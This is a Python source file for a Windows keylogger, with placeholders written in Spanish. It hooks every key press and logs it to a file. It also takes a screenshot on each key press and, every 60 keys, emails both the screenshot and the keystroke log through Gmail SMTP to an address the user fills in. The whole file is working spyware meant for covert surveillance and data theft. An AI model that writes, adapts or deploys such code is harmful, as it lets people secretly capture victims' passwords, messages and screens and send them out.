import win32api
import win32console
import win32gui
import PIL.ImageGrab
import datetime
import smtplib
import mimetypes
import autopy

from email.MIMEMultipart import MIMEMultipart
from email.mime.multipart import MIMEMultipart
from email.MIMEImage import MIMEImage
from email.mime.text import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders
import pythoncom, pyHook, sys, logging

#win = win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)
l = 0
LOG_FILENAME = 'C:\\Users\ruta\Desktop\key.txt'

def OnKeyboardEvent(event):
     
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    print "Key: ", chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    
    print(l)
    Screenshot()
    correo()     
    return True
 
def Screenshot(): 
     global l
     l+=1
     b = autopy.bitmap.capture_screen()
     b.save('C:\\Users\ruta\Desktop\key2.png')
   # d=datetime.datetime.now().strftime('%Y_%m_%d_%H_%M_%S')
    #print(d) 
    #img=PIL.ImageGrab.grab()
    #h = img.save( str(str(d)+'.png'),'png')
  

  #return True
def correo():
   global l     

   if l==60:
  
              
     msg = MIMEMultipart()
     msg['From']="tu correo"
     msg['To']="donde lo vas a enviar"
     msg['Subject']="Correo con imagen Adjunta"
   
     file = open('C:\\Users\ruta\Desktop\key2.png', 'rb')
     attach_image = MIMEImage(file.read())
     attach_image.add_header('Content-Disposition', 'attachment; filename = "imagen.png"')
     msg.attach(attach_image)
   
     fb=open('C:\\Users\ruta\Desktop\key.txt', 'rb')
     adjunto= MIMEBase('multipart','encryted')
     adjunto.set_payload(fb.read())
     fb.close()
     encoders.encode_base64(adjunto)
     adjunto.add_header('Content-Disposition', 'attachment; filename = "key.txt"')
     msg.attach(adjunto)

     mailServer = smtplib.SMTP('smtp.gmail.com',587)
     mailServer.ehlo()
     mailServer.starttls()
     mailServer.ehlo()
     mailServer.login("tu correo","clave de tu correo")

     mailServer.sendmail("tu correo", "correo de destino", msg.as_string())

     mailServer.close()
     l=0
  #OnKeyboardEvent()
  
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
